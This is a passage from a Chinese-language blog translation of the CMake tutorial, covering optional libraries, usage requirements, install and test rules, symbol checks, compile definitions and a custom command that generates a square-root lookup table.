cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add the MathFunctions library</span></span><br><span class="line"><span class="keyword">add_subdirectory</span>(MathFunctions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add the executable</span></span><br><span class="line"><span class="keyword">add_executable</span>(Tutorial tutorial.cxx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(Tutorial PUBLIC MathFunctions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add the binary tree to the search path for include files</span></span><br><span class="line"><span class="comment"># so that we will find TutorialConfig.h</span></span><br><span class="line"><span class="keyword">target_include_directories</span>(Tutorial PUBLIC</span><br><span class="line">                          <span class="string">"${PROJECT_BINARY_DIR}"</span></span><br><span class="line">                          <span class="string">"${PROJECT_SOURCE_DIR}/MathFunctions"</span></span><br><span class="line">                          )</span><br></pre></td></tr></tbody></table></figure><p>现在让我们把MathFunctions库变成可选的。虽然对于本教程来说，没有必要这样做，但对于大型项目来说，这是一种常见的情况。第一步是在顶层的CMakeLists.txt文件中添加一个选项（<code>option</code>放在<code>configure_file</code>前面）:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">option</span>(USE_MYMATH <span class="string">"Use tutorial provided math implementation"</span> <span class="keyword">ON</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># configure a header file to pass some of the CMake settings</span></span><br><span class="line"><span class="comment"># to the source code</span></span><br><span class="line"><span class="keyword">configure_file</span>(TutorialConfig.h.in TutorialConfig.h)</span><br></pre></td></tr></tbody></table></figure><p>这个选项会在 <code>cmake-gui</code> 和 <code>ccmake</code> 中显示，默认值为 ON，用户可以更改。这个设置将被保存在缓存中，这样用户就不需要在每次运行 CMake 的时候设置这个值。</p><p> 下一个步是使构建和链接<code>MathFunctions</code>库成为条件判断的。要做到这一点，我们将顶层<code>CMakeLists.txt</code>文件的结尾改为如下所示:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(USE_MYMATH)</span><br><span class="line">  <span class="keyword">add_subdirectory</span>(MathFunctions)</span><br><span class="line">  <span class="keyword">list</span>(APPEND EXTRA_LIBS MathFunctions)</span><br><span class="line">  <span class="keyword">list</span>(APPEND EXTRA_INCLUDES <span class="string">"${PROJECT_SOURCE_DIR}/MathFunctions"</span>)</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># add the executable</span></span><br><span class="line"><span class="keyword">add_executable</span>(Tutorial tutorial.cxx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(Tutorial PUBLIC <span class="variable">${EXTRA_LIBS}</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add the binary tree to the search path for include files</span></span><br><span class="line"><span class="comment"># so that we will find TutorialConfig.h</span></span><br><span class="line"><span class="keyword">target_include_directories</span>(Tutorial PUBLIC</span><br><span class="line">                           <span class="string">"${PROJECT_BINARY_DIR}"</span></span><br><span class="line">                           <span class="variable">${EXTRA_INCLUDES}</span></span><br><span class="line">                           )</span><br></pre></td></tr></tbody></table></figure><p>请注意使用变量<code>EXTRA_LIBS</code>来收集任何可选的库，以便以后链接到可执行文件中。变量<code>EXTRA_INCLUDES</code>也同样用于处理可选的头文件。这是在处理许多可选组件时的传统方法，下一步讲介绍更为现代化方法。</p><p>相应的，需要简单修改源代码。首先，在<code>tutorial.cxx</code>中，如果我们需要的话，就加入<code>MathFunctions.h</code>头文件：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MYMATH</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">"MathFunctions.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure><p>然后，使用<code>USE_MYMATH</code>控制库函数的调用：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MYMATH</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">double</span> outputValue = mysqrt(inputValue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">double</span> outputValue = <span class="built_in">sqrt</span>(inputValue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure><p>由于源代码现在需要 <code>USE_MYMATH</code>， 我们可以在 <code>TutorialConfig.h.in</code>中加入下面这行:</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#cmakedefine USE_MYMATH</span></span><br></pre></td></tr></tbody></table></figure><p>接下来，在构建时，可以使用<code>-D</code>添加使用选项，例如要关闭选项，使用：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake .. -DUSE_MYMATH=OFF</span><br></pre></td></tr></tbody></table></figure><h1 id="添加库的使用条件"><a href="#添加库的使用条件" class="headerlink" title="添加库的使用条件"></a>添加库的使用条件</h1><p>使用条件允许更好地控制库或可执行文件的链接和<code>include</code>行，同时也给予 CMake 内部target的转义属性更多的控制。利用使用条件的主要命令有:</p><ul><li><a href="https://cmake.org/cmake/help/latest/command/target_compile_definitions.html#command:target_compile_definitions"><code>target_compile_definitions()</code></a></li><li><a href="https://cmake.org/cmake/help/latest/command/target_compile_options.html#command:target_compile_options"><code>target_compile_options()</code></a></li><li><a href="https://cmake.org/cmake/help/latest/command/target_include_directories.html#command:target_include_directories"><code>target_include_directories()</code></a></li><li><a href="https://cmake.org/cmake/help/latest/command/target_link_libraries.html#command:target_link_libraries"><code>target_link_libraries()</code></a></li></ul><p>让我们从步骤2开始中重构我们的代码，使用现代CMake的使用条件方法。我们首先声明，任何人链接到<code>MathFunctions</code>都需要包含当前目录，而<code>MathFunctions</code>本身不需要。所以这可以成为一个<code>INTERFACE</code>的使用条件。</p><p>记住，<code>INTERFACE</code>是指使用者需要而提供者不需要的东西。在<code>MathFunctions/CMakeLists.txt</code>的末尾添加以下几行:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">target_include_directories</span>(MathFunctions</span><br><span class="line">          INTERFACE <span class="variable">${CMAKE_CURRENT_SOURCE_DIR}</span></span><br><span class="line">          )</span><br></pre></td></tr></tbody></table></figure><p>现在我们已经指定了 <code>MathFunctions</code>的使用条件，我们可以安全地从顶层的 <code>CMakeLists.txt</code>中删除对 <code>EXTRA_INCLUDES</code> 变量的使用。</p><p>此处</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(USE_MYMATH)</span><br><span class="line">    <span class="comment"># add the MathFunctions library</span></span><br><span class="line">    <span class="keyword">add_subdirectory</span>(MathFunctions)</span><br><span class="line">    <span class="keyword">list</span>(APPEND EXTRA_LIBS MathFunctions)</span><br><span class="line"><span class="keyword">endif</span>()</span><br></pre></td></tr></tbody></table></figure><p>和此处</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">target_include_directories</span>(Tutorial PUBLIC</span><br><span class="line">                           <span class="string">"${PROJECT_BINARY_DIR}"</span></span><br><span class="line">                           )</span><br></pre></td></tr></tbody></table></figure><p>之后便可以重新构建项目了。</p><h1 id="安装和测试"><a href="#安装和测试" class="headerlink" title="安装和测试"></a>安装和测试</h1><p>现在我们可以开始为我们的项目添加安装规则和测试支持。</p><h2 id="安装规则"><a href="#安装规则" class="headerlink" title="安装规则"></a>安装规则</h2><p>安装规则相当简单：对于<code>MathFunctions</code>，我们要安装库和头文件，对于应用程序，我们要安装可执行文件和配置的头文件。</p><p>所以在<code>MathFunctions/CMakeLists.txt</code>中添加：</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">install</span>(TARGETS MathFunctions DESTINATION lib)</span><br><span class="line"><span class="keyword">install</span>(FILES MathFunctions.h DESTINATION <span class="keyword">include</span>)</span><br></pre></td></tr></tbody></table></figure><p>在顶层的<code>CMakeLists.txt</code>中 添加：</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">install</span>(TARGETS Tutorial DESTINATION bin)</span><br><span class="line"><span class="keyword">install</span>(FILES <span class="string">"${PROJECT_BINARY_DIR}/TutorialConfig.h"</span></span><br><span class="line">  DESTINATION <span class="keyword">include</span></span><br><span class="line">  )</span><br></pre></td></tr></tbody></table></figure><p>这就是为<code>tutorial</code>创建一个基本的本地安装所需要的全部内容。</p><p>现在重新来配置项目并构建它。然后在命令行使用<code>cmake</code> 命令的<code>install</code> 选项来运行安装步骤 (在 3.15 中引入，旧版本的 CMake 必须使用 make install)。对于多配置工具，不要忘记使用–config参数来指定配置。如果使用IDE，只需构建<code>INSTALL</code> target。这一步将安装相应的头文件、库和可执行文件。例如:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake --install .</span><br></pre></td></tr></tbody></table></figure><p>CMake 变量 <code>CMAKE_INSTALL_PREFIX</code> 用于确定文件安装的根目录。如果使用 <code>cmake --install</code> 命令，安装目录可以通过 <code>--prefix</code>参数重写。例如：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake --install . --prefix <span class="string">"/home/myuser/installdir"</span></span><br></pre></td></tr></tbody></table></figure><h2 id="测试支持"><a href="#测试支持" class="headerlink" title="测试支持"></a>测试支持</h2><p>接下来，测试我们的应用程序。在顶层的<code>CMakeLists.txt</code>文件的末尾，我们可以启用测试，然后添加一些基本测试以验证应用程序是否正常运行。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enable_testing</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># does the application run</span></span><br><span class="line"><span class="keyword">add_test</span>(NAME Runs <span class="keyword">COMMAND</span> Tutorial <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># does the usage message work?</span></span><br><span class="line"><span class="keyword">add_test</span>(NAME Usage <span class="keyword">COMMAND</span> Tutorial)</span><br><span class="line"><span class="keyword">set_tests_properties</span>(Usage</span><br><span class="line">  PROPERTIES PASS_REGULAR_EXPRESSION <span class="string">"Usage:.*number"</span></span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line"><span class="comment"># define a function to simplify adding tests</span></span><br><span class="line"><span class="keyword">function</span>(do_test <span class="keyword">target</span> arg result)</span><br><span class="line">  <span class="keyword">add_test</span>(NAME Comp<span class="variable">${arg}</span> <span class="keyword">COMMAND</span> <span class="variable">${target}</span> <span class="variable">${arg}</span>)</span><br><span class="line">  <span class="keyword">set_tests_properties</span>(Comp<span class="variable">${arg}</span></span><br><span class="line">    PROPERTIES PASS_REGULAR_EXPRESSION <span class="variable">${result}</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">endfunction</span>(do_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do a bunch of result based tests</span></span><br><span class="line">do_test(Tutorial <span class="number">4</span> <span class="string">"4 is 2"</span>)</span><br><span class="line">do_test(Tutorial <span class="number">9</span> <span class="string">"9 is 3"</span>)</span><br><span class="line">do_test(Tutorial <span class="number">5</span> <span class="string">"5 is 2.236"</span>)</span><br><span class="line">do_test(Tutorial <span class="number">7</span> <span class="string">"7 is 2.645"</span>)</span><br><span class="line">do_test(Tutorial <span class="number">25</span> <span class="string">"25 is 5"</span>)</span><br><span class="line">do_test(Tutorial -<span class="number">25</span> <span class="string">"-25 is [-nan|nan|0]"</span>)</span><br><span class="line">do_test(Tutorial <span class="number">0.0001</span> <span class="string">"0.0001 is 0.01"</span>)</span><br></pre></td></tr></tbody></table></figure><p>第一个测试只是简单地验证应用程序是否运行，没有segfault或其他崩溃，并且返回值为零。这是CTest测试的基本形式。</p><p>下一个测试利用<code>PASS_REGULAR_EXPRESSION</code>测试属性来验证测试的输出是否包含某些字符串。在这种情况下，验证当提供的参数数量不正确时，是否会打印出使用信息。</p><p>最后，我们有一个名为do_test的函数，它运行应用程序并验证给定输入的计算平方根是否正确。每调用一次<code>do_test</code>，就会在项目中添加一个测试，包括名称、输入和基于传递的参数的预期结果。</p><p>重新构建应用程序，然后cd到二进制目录，运行<code>ctest</code>可执行文件：<code>ctest -N</code>（<code>--show-only[=format]</code>）和<code>ctest -VV</code>（<code>--extra-verbose</code>）。对于多配置生成器（如Visual Studio），必须指定配置类型。例如，要在Debug模式下运行测试，从构建目录中使用<code>ctest -C Debug -VV</code>（不是Debug子目录！）。或者，从 IDE 中构建<code>RUN_TESTS</code>目标。</p><h1 id="添加系统自检"><a href="#添加系统自检" class="headerlink" title="添加系统自检"></a>添加系统自检</h1><p>让我们考虑在我们的项目中添加一些代码，这些代码取决于目标平台可能没有的功能。在这个例子中，我们将添加一些代码，这些代码取决于目标平台是否有log和exp函数。当然，几乎每个平台都有这些函数，但在本教程中，假设它们并不常见。</p><p>如果平台上有log和exp，那么我们将使用它们来计算mysqrt函数中的平方根。我们首先使用顶层<code>CMakeLists.txt</code>中的<code>CheckSymbolExists</code>模块测试这些函数是否可用。在某些平台上，我们需要链接到<code>m</code>库。如果最初没有找到<code>log</code>和<code>exp</code>，则需要使用<code>m</code>库并再次尝试。</p><p>我们将使用<code>TutorialConfig.h.in</code>中的新定义，所以一定要在配置该文件之前设置它们。</p><p>如果系统上有<code>log</code>和<code>exp</code>，那么我们将在<code>mysqrt</code>函数中使用它们来计算平方根。在<code>MathFunctions/mysqrt.cxx</code>中的<code>mysqrt</code>函数中添加以下代码（在返回结果之前不要忘记<code>#endif</code>！）。</p><p>重新构建项目，会发现无论平台上是否有<code>log</code>和<code>exp</code>，都不会调用它们。因为我们忘记了在<code>mysqrt.cxx</code>中include <code>TutorialConfig.h</code>。现在更新</p><p>我们还需要更新<code>MathFunctions / CMakeLists.txt</code>，以便<code>mysqrt.cxx</code>知道此文件的位置：</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">target_include_directories</span>(MathFunctions</span><br><span class="line">          INTERFACE <span class="variable">${CMAKE_CURRENT_SOURCE_DIR}</span></span><br><span class="line">          PRIVATE <span class="variable">${CMAKE_BINARY_DIR}</span></span><br><span class="line">          )</span><br></pre></td></tr></tbody></table></figure><h2 id="指定编译定义"><a href="#指定编译定义" class="headerlink" title="指定编译定义"></a>指定编译定义</h2><p>除了在<code>TutorialConfig.h</code>中保存<code>HAVE_LOG</code>和<code>HAVE_EXP</code>值，我们还有更好的方法吗？让我们尝试使用<code>target_compile_definitions()</code>。</p><p>首先，从<code>TutorialConfig.h.in</code>中删除定义。我们不再需要在<code>mysqrt.cxx</code>中include <code>TutorialConfig.h</code>或<code>MathFunctions/CMakeLists.txt</code>中的其他include内容。</p><p>接下来，我们可以将<code>HAVE_LOG</code>和<code>HAVE_EXP</code>的检查移至<code>MathFunctions/CMakeLists.txt</code>，然后将这些值指定为<code>PRIVATE</code>编译定义。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(CheckSymbolExists)</span><br><span class="line">check_symbol_exists(log <span class="string">"math.h"</span> HAVE_LOG)</span><br><span class="line">check_symbol_exists(exp <span class="string">"math.h"</span> HAVE_EXP)</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">NOT</span> (HAVE_LOG <span class="keyword">AND</span> HAVE_EXP))</span><br><span class="line">  <span class="keyword">unset</span>(HAVE_LOG CACHE)</span><br><span class="line">  <span class="keyword">unset</span>(HAVE_EXP CACHE)</span><br><span class="line">  <span class="keyword">set</span>(CMAKE_REQUIRED_LIBRARIES <span class="string">"m"</span>)</span><br><span class="line">  check_symbol_exists(log <span class="string">"math.h"</span> HAVE_LOG)</span><br><span class="line">  check_symbol_exists(exp <span class="string">"math.h"</span> HAVE_EXP)</span><br><span class="line">  <span class="keyword">if</span>(HAVE_LOG <span class="keyword">AND</span> HAVE_EXP)</span><br><span class="line">    <span class="keyword">target_link_libraries</span>(MathFunctions PRIVATE m)</span><br><span class="line">  <span class="keyword">endif</span>()</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># add compile definitions</span></span><br><span class="line"><span class="keyword">if</span>(HAVE_LOG <span class="keyword">AND</span> HAVE_EXP)</span><br><span class="line">  <span class="keyword">target_compile_definitions</span>(MathFunctions</span><br><span class="line">                             PRIVATE <span class="string">"HAVE_LOG"</span> <span class="string">"HAVE_EXP"</span>)</span><br><span class="line"><span class="keyword">endif</span>()</span><br></pre></td></tr></tbody></table></figure><p>之后再重新构建并运行项目，查看结果。</p><h1 id="添加自定义命令和生成的文件"><a href="#添加自定义命令和生成的文件" class="headerlink" title="添加自定义命令和生成的文件"></a>添加自定义命令和生成的文件</h1><p>假设，作为本教程的目的，我们决定永远不要使用平台提供的<code>log</code>和<code>exp</code>函数，而是想生成一个预计算值的表，以便在<code>mysqrt</code>函数中使用。在本节中，我们将创建该表作为构建过程的一部分，然后将该表编译到我们的应用程序中。</p><p>首先，让我们删除<code>MathFunctions/CMakeLists.txt</code>中对<code>log</code>和<code>exp</code>函数的检查。然后从<code>mysqrt.cxx</code>中删除对<code>HAVE_LOG</code>和<code>HAVE_EXP</code>的检查。同时，我们可以删除<code>#include</code> 。</p><p>在<code>MathFunctions</code>子目录中，提供了一个名为<code>MakeTable.cxx</code>的新源文件来生成表。</p><p>查看完文件后，我们可以看到该表是作为有效的C ++代码生成的，并且输出文件名作为参数传入。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A simple program that builds a sqrt table</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>{</span><br><span class="line">    <span class="comment">// make sure we have enough arguments</span></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">fout</span><span class="params">(argv[<span class="number">1</span>], <span class="built_in">std</span>::ios_base::out)</span></span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">bool</span> fileOpen = fout.is_open();</span><br><span class="line">    <span class="keyword">if</span> (fileOpen) {</span><br><span class="line">        fout &lt;&lt; <span class="string">"double sqrtTable[] = {"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) {</span><br><span class="line">            fout &lt;&lt; <span class="built_in">sqrt</span>(<span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(i)) &lt;&lt; <span class="string">","</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// close the table with a zero</span></span><br><span class="line">        fout &lt;&lt; <span class="string">"0};"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        fout.close();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> fileOpen ? <span class="number">0</span> : <span class="number">1</span>; <span class="comment">// return 0 if wrote the file</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>下一步是将适当的命令添加到<code>MathFunctions/CMakeLists.txt</code>文件中，以构建<code>MakeTable</code>可执行文件，然后在构建过程中运行它。需要一些命令来完成此操作。</p><p>首先，在<code>MathFunctions/CMakeLists.txt</code>的顶部，添加<code>MakeTable</code>的可执行文件，就像添加任何其他可执行文件一样。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_executable</span>(MakeTable MakeTable.cxx)</span><br></pre></td></tr></tbody></table></figure><p>然后，我们添加一个自定义命令，该命令指定如何通过运行<code>MakeTable</code>来产生<code>Table.h</code>。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_custom_command</span>(</span><br><span class="line">  OUTPUT <span class="variable">${CMAKE_CURRENT_BINARY_DIR}</span>/Table.h</span><br><span class="line">  <span class="keyword">COMMAND</span> MakeTable <span class="variable">${CMAKE_CURRENT_BINARY_DIR}</span>/Table.h</span><br><span class="line">  DEPENDS MakeTable</span><br><span class="line">  )</span><br></pre></td></tr></tbody></table></figure><p>接下来，我们必须让CMake知道<code>mysqrt.cxx</code>如何依赖生成的文件<code>Table.h</code>。通过将生成的<code>Table.h</code>添加到库<code>MathFunctions</code>的源列表中，可以完成此操作。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(MathFunctions</span><br><span class="line">            mysqrt.cxx</span><br><span class="line">            <span class="variable">${CMAKE_CURRENT_BINARY_DIR}</span>/Table.h</span><br><span class="line">            )</span><br></pre></td></tr></tbody></table></figure><p>我们还必须将当前的二进制目录添加到包含目录列表中，以便<code>mysqrt.cxx</code>可以找到并包含<code>Table.h</code>。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">target_include_directories</span>(MathFunctions</span><br><span class="line">          INTERFACE <span class="variable">${CMAKE_CURRENT_SOURCE_DIR}</span></span><br><span class="line">          PRIVATE <span class="variable">${CMAKE_CURRENT_BINARY_DIR}</span></span><br><span class="line">          )</span><br></pre></td></tr></tbody></table></figure><p>现在，我们使用生成的表。首先，修改<code>mysqrt.cxx</code>以包含<code>Table.h</code>。接下来，我们可以重写<code>mysqrt</code>函数以使用该表：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"MathFunctions.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Table.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">mysqrt</span><span class="params">(<span class="keyword">double</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (x &lt;= <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use the table to help find an initial value</span></span><br><span class="line">    <span class="keyword">double</span> result = x;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">1</span> &amp;&amp; x &lt; <span class="number">10</span>) {</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Use the table to help find an initial value "</span></span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        result = sqrtTable[<span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(x)];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// do ten iterations</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) {</span><br><span class="line">        <span class="keyword">if</span> (result &lt;= <span class="number">0</span>) {</span><br><span class="line">            result = <span class="number">0.1</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">double</span> delta = x - (result * result);</span><br><span class="line">        result = result + <span class="number">0.5</span> * delta / result;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Computing sqrt of "</span> &lt;&lt; x &lt;&lt; <span class="string">" to be "</span> &lt;&lt; result</span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>构建此项目时，它将首先构建<code>MakeTable</code>可执行文件。然后它将运行<code>MakeTable</code>生成<code>Table.h</code>。最后，它将编译包括<code>Table.h</code>的<code>mysqrt.cxx</code>，以生成<code>MathFunctions</code>库。</p><p>做完这些更新后，再继续构建项目。运行构建好的Tutorial可执行文件，并验证结果是否与前面相同。</p><h1 id="构建安装程序"><a href="#构建安装程序" class="headerlink" 